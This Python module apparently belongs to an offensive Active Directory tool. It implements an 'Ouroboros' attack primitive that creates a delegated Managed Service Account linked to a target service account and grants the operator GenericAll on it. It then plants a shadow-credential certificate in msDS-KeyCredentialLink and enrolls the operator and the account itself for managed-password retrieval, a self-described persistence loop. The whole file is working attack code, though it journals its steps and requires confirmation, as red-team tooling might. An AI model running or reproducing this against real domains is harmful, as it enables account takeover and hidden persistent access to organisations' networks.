from __future__ import annotations

import hashlib
import secrets
from pathlib import Path
from typing import TYPE_CHECKING, Any

from dmsa_reaper.ldap.dacl_editor import (
    ace_fingerprint,
    add_aces_to_sd,
    build_allow_genericall_ace,
    read_sd,
    write_sd,
)
from dmsa_reaper.ldap.modify import add_object, modify_attribute
from dmsa_reaper.models import AttributeChange, AttributeValue, Operation, PathCandidate
from dmsa_reaper.ops.operation_log import new_operation, save_operation
from dmsa_reaper.ouroboros.credentials import (
    generate_shadow_credential,
    secure_write,
    secure_write_json,
)
from dmsa_reaper.primitives._ldap_helpers import (
    DMSA_MANAGED_PASSWORD_INTERVAL,
    DMSA_OBJECT_CLASSES,
    DMSA_STATE_COMPLETED,
    DMSA_SUPPORTED_ENCRYPTION_TYPES,
    DMSA_UAC,
    build_dmsa_creation_attributes,
    build_group_msa_membership_sd_for_sids,
    dmsa_dn,
    generate_dmsa_name,
    journal_created_object,
    read_attribute,
    read_object_sid,
    read_raw_attribute,
    resolve_meta,
)
from dmsa_reaper.primitives.base import Primitive, PrimitiveError

if TYPE_CHECKING:
    from ldap3 import Connection


_STATE_ACTIVE = 2
_TARGET_ATTRS = frozenset({
    "msDS-SupersededManagedAccountLink",
    "msDS-SupersededServiceAccountState",
})


def _typed(values: list[Any] | None) -> list[AttributeValue] | None:
    return [AttributeValue.from_python(value) for value in values] if values else None


def _recorded_replace(
    operation: Operation,
    conn: "Connection",
    *,
    dn: str,
    attribute: str,
    values: list[Any],
    step_name: str,
    raw_before: bool = False,
) -> None:
    before = (
        read_raw_attribute(conn, dn, attribute)
        if raw_before
        else read_attribute(conn, dn, attribute)
    )
    change = AttributeChange(
        dn=dn,
        attribute=attribute,
        before=_typed(before),
        after=_typed(values),
        mode="replace",
        step_name=step_name,
        step_status="planned",
    )
    operation.changed_attrs.append(change)
    save_operation(operation)
    modify_attribute(conn, dn, attribute, values, mode="replace")
    change.step_status = "written"
    save_operation(operation)


class OuroborosPrimitive(Primitive):
    """Create a self-authenticating, self-authorizing dMSA persistence loop."""

    name = "ouroboros"

    def check(self, path: PathCandidate) -> bool:
        return (
            path.primitive == self.name
            and path.requires_create_dmsa
            and path.requires_modify_target
        )

    def plan(self, path: PathCandidate) -> Operation:
        return new_operation(
            primitive=self.name,
            path_id=path.id,
            metadata={"path": path.model_dump()},
        )

    def preflight(
        self,
        path: PathCandidate,
        *,
        target_dn: str | None = None,
        container_dn: str | None = None,
    ) -> list[str]:
        warnings = super().preflight(
            path,
            target_dn=target_dn,
            container_dn=container_dn,
        )
        if not (target_dn or path.target_dn):
            raise PrimitiveError("Ouroboros requires a target service-account DN")
        if not (container_dn or path.container_dn):
            raise PrimitiveError("Ouroboros requires a dMSA creation container")
        return warnings

    def execute(
        self,
        operation: Operation,
        *,
        confirm: bool = False,
        conn: "Connection | None" = None,
    ) -> Operation:
        if not confirm:
            raise PrimitiveError("--confirm is required for LDAP writes")
        if conn is None:
            raise PrimitiveError("--confirm requires an active LDAP connection")

        meta = operation.metadata
        container_dn = resolve_meta(meta, "container_dn")
        target_dn = resolve_meta(meta, "target_dn")
        principal_sid = resolve_meta(meta, "principal_sid")
        domain = resolve_meta(meta, "domain")
        if not container_dn:
            raise PrimitiveError("container_dn is required in operation metadata")
        if not target_dn:
            raise PrimitiveError("target_dn is required in operation metadata")
        if not principal_sid:
            raise PrimitiveError("principal_sid is required in operation metadata")
        if not domain:
            raise PrimitiveError("domain is required to construct the dMSA")
        writable = set(meta.get("target_writable_attrs") or [])
        if not _TARGET_ATTRS.issubset(writable):
            raise PrimitiveError(
                "Ouroboros requires target-side WriteProperty on "
                "msDS-SupersededManagedAccountLink and "
                "msDS-SupersededServiceAccountState"
            )

        cn = generate_dmsa_name(meta.get("dmsa_name"))
        new_dn = dmsa_dn(cn, container_dn)
        sam = f"{cn}$"
        try:
            creation_attrs = build_dmsa_creation_attributes(
                cn=cn,
                domain=domain,
                principal_sid=principal_sid,
                target_dn=target_dn,
            )
        except ValueError as exc:
            raise PrimitiveError(str(exc)) from exc

        # Generate and durably store the private key before planting its public
        # half in AD.  A process failure can therefore never leave an unknown
        # Shadow Credential behind.
        try:
            pfx_password = secrets.token_urlsafe(24)
            material = generate_shadow_credential(
                subject=sam,
                owner_dn=new_dn,
                pfx_password=pfx_password,
            )
            runs_dir = Path(str(meta.get("runs_dir") or ".reaper/runs"))
            run_dir = (runs_dir / operation.id).resolve()
            pfx_path = run_dir / "ouroboros.pfx"
            manifest_path = run_dir / "ouroboros-credential.json"
            secure_write(pfx_path, material.pfx_bytes)
            secure_write_json(
                manifest_path,
                {
                    "operation_id": operation.id,
                    "dmsa_sam": sam,
                    "dmsa_dn": new_dn,
                    "device_id": material.device_id,
                    "pfx_path": str(pfx_path),
                    "pfx_password": pfx_password,
                },
            )
            operation.metadata["ouroboros"] = {
                "run_dir": str(run_dir),
                "pfx_path": str(pfx_path),
                "credential_manifest": str(manifest_path),
                "pfx_sha256": hashlib.sha256(material.pfx_bytes).hexdigest(),
                "key_credential_device_id": material.device_id,
            }
            operation.metadata["created_dmsa_dn"] = new_dn
            operation.metadata["created_dmsa_sam"] = sam
            save_operation(operation)
        except Exception as exc:
            operation.status = "failed"
            operation.errors.append(f"Ouroboros credential generation failed: {exc}")
            save_operation(operation)
            raise PrimitiveError(
                f"could not prepare the Ouroboros credential artifacts: {exc}"
            ) from exc

        # Stage 1: create the dMSA with the forward migration link, then write
        # the reciprocal target-side relationship required by patched KDCs.
        operation.status = "running"
        operation.maybe_created_dns.append(new_dn)
        save_operation(operation)
        try:
            add_object(conn, new_dn, DMSA_OBJECT_CLASSES, creation_attrs)
            journal_created_object(operation, conn, new_dn)
            dmsa_sid = read_object_sid(conn, new_dn)
            operation.metadata["created_dmsa_sid"] = dmsa_sid
            if new_dn in operation.maybe_created_dns:
                operation.maybe_created_dns.remove(new_dn)
            operation.created_dns.append(new_dn)
            save_operation(operation)

            # Stage 2: the creator owns the new object and can therefore add an
            # explicit GenericAll ACE for predictable downstream LDAP writes.
            original_sd = read_sd(conn, new_dn)
            dacl_change = AttributeChange(
                dn=new_dn,
                attribute="nTSecurityDescriptor",
                before=[AttributeValue.security_descriptor(original_sd)],
                after=None,
                mode="replace",
                step_name="ouroboros-dacl",
                step_status="planned",
            )
            operation.changed_attrs.append(dacl_change)
            save_operation(operation)
            generic_all_ace = build_allow_genericall_ace(principal_sid)
            modified_sd = add_aces_to_sd(original_sd, [generic_all_ace])
            operation.metadata.setdefault("added_aces", []).append(
                {
                    "dn": new_dn,
                    "sha256": ace_fingerprint(generic_all_ace),
                    "step_name": "ouroboros-dacl",
                }
            )
            save_operation(operation)
            write_sd(conn, new_dn, modified_sd)
            dacl_change.after = [AttributeValue.security_descriptor(modified_sd)]
            dacl_change.step_status = "written"
            save_operation(operation)

            # Complete Stage 1's reciprocal target relationship only after the
            # new object has an explicit delete-capable ACE.  If a later target
            # write fails, automatic cleanup can still remove the dMSA.
            _recorded_replace(
                operation,
                conn,
                dn=target_dn,
                attribute="msDS-SupersededManagedAccountLink",
                values=[new_dn],
                step_name="ouroboros-target-link",
            )
            _recorded_replace(
                operation,
                conn,
                dn=target_dn,
                attribute="msDS-SupersededServiceAccountState",
                values=[_STATE_ACTIVE],
                step_name="ouroboros-target-state",
            )

            # Stage 3: plant the certificate-backed authentication path while
            # preserving any server-populated KeyCredential values.
            previous_key_credentials = (
                read_attribute(conn, new_dn, "msDS-KeyCredentialLink") or []
            )
            _recorded_replace(
                operation,
                conn,
                dn=new_dn,
                attribute="msDS-KeyCredentialLink",
                values=[
                    *previous_key_credentials,
                    material.key_credential_value,
                ],
                step_name="ouroboros-shadow-credential",
            )

            # Stage 4: authorize both the operator and the dMSA itself.  The
            # descriptor builder uses expanded specific rights (0x000F01FF),
            # not the GA shorthand rejected by the KDC's dMSA access check.
            membership_sd = build_group_msa_membership_sd_for_sids(
                [principal_sid, dmsa_sid]
            )
            _recorded_replace(
                operation,
                conn,
                dn=new_dn,
                attribute="msDS-GroupMSAMembership",
                values=[membership_sd],
                step_name="ouroboros-self-enrollment",
                raw_before=True,
            )
        except Exception as exc:
            operation.status = "partial-failed"
            operation.errors.append(f"Ouroboros stage failed: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            raise PrimitiveError(
                f"Ouroboros execution failed; partial state is journaled: {exc}"
            ) from exc

        operation.status = "executed"
        save_operation(operation)
        return operation

    def dry_run_steps(self, operation: Operation) -> list[str]:
        meta = operation.metadata
        container_dn = resolve_meta(meta, "container_dn") or "<container_dn>"
        target_dn = resolve_meta(meta, "target_dn") or "<target_dn>"
        principal_sid = resolve_meta(meta, "principal_sid") or "<principal_sid>"
        domain = resolve_meta(meta, "domain") or "<domain>"
        cn = generate_dmsa_name(meta.get("dmsa_name"))
        new_dn = dmsa_dn(cn, container_dn)
        sam = f"{cn}$"
        return [
            f"STAGE 1a CREATE  {new_dn}",
            f"  object classes                         : {', '.join(DMSA_OBJECT_CLASSES)}",
            f"  sAMAccountName                         : {sam}",
            f"  dNSHostName                            : {cn.lower()}.{domain}",
            f"  userAccountControl                     : {DMSA_UAC}",
            f"  msDS-ManagedPasswordInterval           : {DMSA_MANAGED_PASSWORD_INTERVAL}",
            f"  msDS-DelegatedMSAState                 : {DMSA_STATE_COMPLETED}",
            f"  msDS-ManagedAccountPrecededByLink      : {target_dn}",
            f"  msDS-SupportedEncryptionTypes          : 0x{DMSA_SUPPORTED_ENCRYPTION_TYPES:02x}",
            "",
            f"STAGE 2  MODIFY  {new_dn}",
            f"  nTSecurityDescriptor                   : grant {principal_sid} GenericAll",
            "",
            f"STAGE 1b MODIFY  {target_dn}",
            f"  msDS-SupersededManagedAccountLink      -> {new_dn}",
            f"  msDS-SupersededServiceAccountState     -> {_STATE_ACTIVE}",
            "  (performed after Stage 2 so cleanup retains Delete access)",
            "",
            f"STAGE 3  MODIFY  {new_dn}",
            "  msDS-KeyCredentialLink                 : add generated certificate",
            "  local PFX                              : encrypted, mode 0600",
            "",
            f"STAGE 4  MODIFY  {new_dn}",
            f"  msDS-GroupMSAMembership                : authorize {principal_sid} and dMSA SELF",
            "  access mask                            : 0x000f01ff (expanded specific rights)",
            "",
            "  (CN above is an example; execute generates a new random suffix)",
        ]
